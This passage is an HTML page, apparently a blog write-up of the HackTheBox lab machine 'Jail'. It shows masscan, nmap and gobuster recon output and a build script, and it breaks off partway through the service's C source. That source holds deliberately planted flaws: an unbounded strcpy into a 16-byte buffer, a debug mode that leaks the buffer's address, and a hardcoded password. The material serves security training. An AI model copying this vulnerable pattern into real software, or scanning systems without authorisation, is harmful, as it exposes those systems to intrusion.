@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Jail | Jail Recon Full port scan with masscan m4rc0ff@SittingDucks:~$ sudo masscan -p1-65535 10.10.10.34 -e tun0 --rate=1000 [sudo] password for m4rc0ff:...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="http://127.0.0.1:8000/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="http://127.0.0.1:8000/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="http://127.0.0.1:8000/theme/js/functions.min.js"></script>
+
+  <link href="http://127.0.0.1:8000/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Jail</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="http://127.0.0.1:8000" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="http://127.0.0.1:8000"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="http://127.0.0.1:8000/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="http://127.0.0.1:8000/tag/hackthebox.html" >HackTheBox (33)</a> &#124; 
+                <a href="http://127.0.0.1:8000/tag/in-depth.html" >In-Depth (1)</a> &#124; 
+                <a href="http://127.0.0.1:8000/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="http://127.0.0.1:8000/archives.html" >Archives (36)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-05-20 22:44:00+01:00">Wed 20 May 2020</time></span>
+        <h1 class="entry-title"><a href="http://127.0.0.1:8000/Jail.html">Jail</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="http://127.0.0.1:8000/Jail.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Jail</p>
+<h1 id="recon">Recon</h1>
+<h5 id="full-port-scan-with-masscan">Full port scan with <code>masscan</code></h5>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo masscan -p1-65535 <span class="m">10</span>.10.10.34 -e tun0 --rate<span class="o">=</span><span class="m">1000</span>                                                                         
+<span class="go">[sudo] password for m4rc0ff: </span>
+
+<span class="go">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-07-01 05:52:03 GMT</span>
+<span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span>
+<span class="go">Initiating SYN Stealth Scan</span>
+<span class="go">Scanning 1 hosts [65535 ports/host]</span>
+<span class="go">Discovered open port 22/tcp on 10.10.10.34                                     </span>
+<span class="go">Discovered open port 111/tcp on 10.10.10.34                                    </span>
+<span class="go">Discovered open port 20048/tcp on 10.10.10.34                                  </span>
+<span class="go">Discovered open port 2049/tcp on 10.10.10.34                                   </span>
+<span class="go">Discovered open port 7411/tcp on 10.10.10.34                                   </span>
+<span class="go">Discovered open port 80/tcp on 10.10.10.34 </span>
+</pre></div>
+
+
+<h5 id="service-enumeration-with-nmap">Service enumeration with <code>nmap</code></h5>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sC -sV -p22,111,20048,2049,7411,80 <span class="m">10</span>.10.10.34                                                                                                 Starting Nmap <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2020</span>-07-01 <span class="m">07</span>:30 BST
+<span class="go">Nmap scan report for 10.10.10.34  </span>
+<span class="go">Host is up (0.095s latency).                                                          </span>
+
+<span class="go">PORT      STATE SERVICE    VERSION                                                    </span>
+<span class="go">22/tcp    open  ssh        OpenSSH 6.6.1 (protocol 2.0)                   </span>
+<span class="go">| ssh-hostkey:                                                                        </span>
+<span class="go">|   2048 cd:ec:19:7c:da:dc:16:e2:a3:9d:42:f3:18:4b:e6:4d (RSA)            </span>
+<span class="go">|   256 af:94:9f:2f:21:d0:e0:1d:ae:8e:7f:1d:7b:d7:42:ef (ECDSA)           </span>
+<span class="go">|_  256 6b:f8:dc:27:4f:1c:89:67:a4:67:c5:ed:07:53:af:97 (ED25519)         </span>
+<span class="go">80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))                  </span>
+<span class="go">| http-methods:                                                                       </span>
+<span class="go">|_  Potentially risky methods: TRACE                                                  </span>
+<span class="go">|_http-server-header: Apache/2.4.6 (CentOS)                               </span>
+<span class="go">|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).       </span>
+<span class="go">111/tcp   open  rpcbind    2-4 (RPC #100000)                              </span>
+<span class="go">| rpcinfo:                                                                            </span>
+<span class="go">|   program version    port/proto  service                                            </span>
+<span class="go">|   100000  2,3,4        111/tcp   rpcbind                                            </span>
+<span class="go">|   100000  2,3,4        111/udp   rpcbind                                            </span>
+<span class="go">|   100000  3,4          111/tcp6  rpcbind                                            </span>
+<span class="go">|   100000  3,4          111/udp6  rpcbind                                            </span>
+<span class="go">|   100003  3,4         2049/tcp   nfs                                                </span>
+<span class="go">|   100003  3,4         2049/tcp6  nfs                                                </span>
+<span class="go">|   100003  3,4         2049/udp   nfs                                                </span>
+<span class="go">|   100003  3,4         2049/udp6  nfs                                                </span>
+<span class="go">|   100005  1,2,3      20048/tcp   mountd                                             </span>
+<span class="go">|   100005  1,2,3      20048/tcp6  mountd                                             </span>
+<span class="go">|   100005  1,2,3      20048/udp   mountd                                             </span>
+<span class="go">|   100005  1,2,3      20048/udp6  mountd                                             </span>
+<span class="go">|   100021  1,3,4      40074/tcp   nlockmgr                               </span>
+<span class="go">|   100021  1,3,4      45771/tcp6  nlockmgr                               </span>
+<span class="go">|   100021  1,3,4      50510/udp6  nlockmgr </span>
+<span class="go">|   100021  1,3,4      59030/udp   nlockmgr </span>
+<span class="go">|   100024  1          34457/tcp   status                                                                                                                                    </span>
+<span class="go">|   100024  1          49397/udp6  status                                             </span>
+<span class="go">|   100024  1          60605/udp   status</span>
+<span class="go">|   100024  1          60711/tcp6  status</span>
+<span class="go">|   100227  3           2049/tcp   nfs_acl</span>
+<span class="go">|   100227  3           2049/tcp6  nfs_acl</span>
+<span class="go">|   100227  3           2049/udp   nfs_acl</span>
+<span class="go">|_  100227  3           2049/udp6  nfs_acl</span>
+<span class="go">2049/tcp  open  nfs_acl    3 (RPC #100227)</span>
+<span class="go">7411/tcp  open  daqstream?</span>
+<span class="go">| fingerprint-strings: </span>
+<span class="go">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPD</span>
+<span class="go">String, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, gi</span>
+<span class="go">op, ms-sql-s, oracle-tns: </span>
+<span class="go">|_    OK Ready. Send USER command.</span>
+<span class="go">20048/tcp open  mountd     1-3 (RPC #100005)</span>
+<span class="go">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
+<span class="gp">SF-Port7411-TCP:V=7.80%I=7%D=7/1%Time=5EFC2D92%P=x86_64-pc-linux-gnu%</span>r<span class="o">(</span>NUL
+<span class="gp">SF:L,1D,&quot;OK\x20Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span>r<span class="o">(</span>GenericLines,1D,
+<span class="gp">SF:&quot;OK\x20Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span>r<span class="o">(</span>GetRequest,1D,<span class="s2">&quot;OK\x20</span>
+<span class="gp">SF:Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span><span class="s2">r(HTTPOptions,1D,&quot;</span>OK<span class="se">\x</span>20Ready<span class="se">\</span>
+SF:.<span class="se">\x</span>20Send<span class="se">\x</span>20USER<span class="se">\x</span>20command<span class="se">\.\n</span><span class="s2">&quot;)%r(RTSPRequest,1D,&quot;</span>OK<span class="se">\x</span>20Ready<span class="se">\.\x</span>20S
+<span class="gp">SF:end\x20USER\x20command\.\n&quot;)%</span>r<span class="o">(</span>RPCCheck,1D,<span class="s2">&quot;OK\x20Ready\.\x20Send\x20US</span>
+<span class="gp">SF:ER\x20command\.\n&quot;)%</span><span class="s2">r(DNSVersionBindReqTCP,1D,&quot;</span>OK<span class="se">\x</span>20Ready<span class="se">\.\x</span>20Send<span class="se">\x</span><span class="m">2</span>
+<span class="gp">SF:0USER\x20command\.\n&quot;)%</span>r<span class="o">(</span>DNSStatusRequestTCP,1D,<span class="s2">&quot;OK\x20Ready\.\x20Send\</span>
+<span class="s2">SF:x20USER\x20command\.\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>Help,1D,<span class="s2">&quot;OK\x20Ready\.\x20Send\x20USER\x20co</span>
+<span class="gp">SF:mmand\.\n&quot;)%</span><span class="s2">r(SSLSessionReq,1D,&quot;</span>OK<span class="se">\x</span>20Ready<span class="se">\.\x</span>20Send<span class="se">\x</span>20USER<span class="se">\x</span>20comman
+<span class="gp">SF:d\.\n&quot;)%</span>r<span class="o">(</span>TerminalServerCookie,1D,<span class="s2">&quot;OK\x20Ready\.\x20Send\x20USER\x20com</span>
+<span class="gp">SF:mand\.\n&quot;)%</span><span class="s2">r(TLSSessionReq,1D,&quot;</span>OK<span class="se">\x</span>20Ready<span class="se">\.\x</span>20Send<span class="se">\x</span>20USER<span class="se">\x</span>20command
+<span class="gp">SF:\.\n&quot;)%r(Kerberos,1D,&quot;OK\x20Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span>r<span class="o">(</span>
+<span class="gp">SF:SMBProgNeg,1D,&quot;OK\x20Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span>r<span class="o">(</span>X11Prob
+<span class="gp">SF:e,1D,&quot;OK\x20Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span>r<span class="o">(</span>FourOhFourReques
+<span class="gp">SF:t,1D,&quot;OK\x20Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span>r<span class="o">(</span>LPDString,1D,<span class="s2">&quot;OK</span>
+<span class="gp">SF:\x20Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span><span class="s2">r(LDAPSearchReq,1D,&quot;</span>OK<span class="se">\x</span><span class="m">20</span>
+<span class="gp">SF:Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span>r<span class="o">(</span>LDAPBindReq,1D,<span class="s2">&quot;OK\x20Ready\</span>
+<span class="s2">SF:.\x20Send\x20USER\x20command\.\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,1D,<span class="s2">&quot;OK\x20Ready\.\x20Se</span>
+<span class="gp">SF:nd\x20USER\x20command\.\n&quot;)%</span><span class="s2">r(LANDesk-RC,1D,&quot;</span>OK<span class="se">\x</span>20Ready<span class="se">\.\x</span>20Send<span class="se">\x</span>20U
+<span class="gp">SF:SER\x20command\.\n&quot;)%</span>r<span class="o">(</span>TerminalServer,1D,<span class="s2">&quot;OK\x20Ready\.\x20Send\x20USER</span>
+<span class="gp">SF:\x20command\.\n&quot;)%</span><span class="s2">r(NCP,1D,&quot;</span>OK<span class="se">\x</span>20Ready<span class="se">\.\x</span>20Send<span class="se">\x</span>20USER<span class="se">\x</span>20command<span class="se">\.\</span>
+SF:n<span class="s2">&quot;)%r(NotesRPC,1D,&quot;</span>OK<span class="se">\x</span>20Ready<span class="se">\.\x</span>20Send<span class="se">\x</span>20USER<span class="se">\x</span>20command<span class="se">\.\n</span><span class="s2">&quot;)%r(Jav</span>
+<span class="gp">SF:aRMI,1D,&quot;OK\x20Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span><span class="s2">r(WMSRequest,1D</span>
+<span class="gp">SF:,&quot;OK\x20Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span><span class="s2">r(oracle-tns,1D,&quot;</span>OK<span class="se">\x</span><span class="m">2</span>
+<span class="gp">SF:0Ready\.\x20Send\x20USER\x20command\.\n&quot;)%</span>r<span class="o">(</span>ms-sql-s,1D,<span class="s2">&quot;OK\x20Ready\.\</span>
+<span class="s2">SF:x20Send\x20USER\x20command\.\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>afp,1D,<span class="s2">&quot;OK\x20Ready\.\x20Send\x20USE</span>
+<span class="gp">SF:R\x20command\.\n&quot;)%</span><span class="s2">r(giop,1D,&quot;</span>OK<span class="se">\x</span>20Ready<span class="se">\.\x</span>20Send<span class="se">\x</span>20USER<span class="se">\x</span>20command<span class="se">\</span>
+SF:.<span class="se">\n</span><span class="s2">&quot;);</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 174.16 seconds</span>
+</pre></div>
+
+
+<h5 id="couple-of-things-that-catched-my-attention">couple of things that catched my attention:</h5>
+<ul>
+<li>port 22 is open and openSSH seems recent, unlikely we will find a way in through it.</li>
+<li>port 80 is open and we will do further analysis on it </li>
+<li>NFS is running on port 2048 and may work in combination with rcpbind on port 111</li>
+<li>the service on port 7411 is not recognized </li>
+</ul>
+<p>Navigating to the <code>http://10.10.10.34</code> web page we can see this:</p>
+<p><a class="mybox" href="../images/jail-http.png" title="web page on port 80"><img alt="my_image" src="../images/jail-http.png"></a></p>
+<p>The source code doesn't show anything so I'll start scanning for directories with <code>gobuster</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> gobuster dir -u http://10.10.10.34 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            http://10.10.10.34</span>
+<span class="go">[+] Threads:        10</span>
+<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/05/23 21:49:28 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/jailuser (Status: 301)</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/05/23 22:29:39 Finished</span>
+<span class="go">===============================================================</span>
+</pre></div>
+
+
+<p>The directory scan provided a result, <code>jailuser</code> and visiting this directory shows another sub-directory, <code>dev</code></p>
+<p><a class="mybox" href="../images/jail-dev.png" title="content of http://10.10.10.34/jailuser/dev"><img alt="my_image" src="../images/jail-dev.png"></a></p>
+<p>I downloaded the <code>compile.sh</code> file to my box and this is its content:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Downloads$</span> cat compile.sh 
+<span class="go">gcc -o jail jail.c -m32 -z execstack</span>
+<span class="go">service jail stop</span>
+<span class="go">cp jail /usr/local/bin/jail</span>
+<span class="go">service jail start</span>
+</pre></div>
+
+
+<p>So the script compiles the <code>jail.c</code> file and outputs the <code>jail</code> executable stack (hence the<code>-z execstack</code> option). Then the script copies the executable under the <code>/usr/local/bin/</code> directory and starts the service <code>jail</code>. </p>
+<p>Giving the fact that we found a binary, I have the impression that we will be dealing with some kind of binary exploitation such as buffer overflow. Let's have a look at the <code>jail.c</code> code:</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;netdb.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="n">debugmode</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">handle</span><span class="p">(</span><span class="kt">int</span> <span class="n">sock</span><span class="p">);</span>
+<span class="kt">int</span> <span class="nf">auth</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">password</span><span class="p">);</span>
+
+<span class="kt">int</span> <span class="nf">auth</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">password</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">userpass</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">response</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">debugmode</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Debug: userpass buffer @ %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">userpass</span><span class="p">);</span>
+        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="s">&quot;admin&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">userpass</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">userpass</span><span class="p">,</span> <span class="s">&quot;1974jailbreak!&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Incorrect username and/or password.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">handle</span><span class="p">(</span><span class="kt">int</span> <span class="n">sock</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">n</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">gotuser</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">gotpass</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="n">strchr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\n\x00</span><span class="s">&quot;</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">token</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="n">debugmode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OK Ready. Send USER command.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">perror</span><span class="p">(</span><span class="s">&quot;ERROR reading from socket&quot;</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">strchr</span><span class="p">);</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">token</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">gotuser</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">gotpass</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="s">&quot;USER &quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">strncpy</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">token</span><span class="o">+</span><span class="mi">5</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">username</span><span class="p">));</span>
+                <span class="n">gotuser</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">gotpass</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OK Send PASS command.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+                    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="s">&quot;PASS &quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">strncpy</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">token</span><span class="o">+</span><span class="mi">5</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">password</span><span class="p">));</span>
+                <span class="n">gotpass</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">gotuser</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OK Send USER command.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+                    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="s">&quot;DEBUG&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">debugmode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">debugmode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OK DEBUG mode on.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+                    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">debugmode</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">debugmode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OK DEBUG mode off.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+                    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="n">token</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">strchr</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">gotuser</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">gotpass</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">auth</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span> <span class="p">{</span>
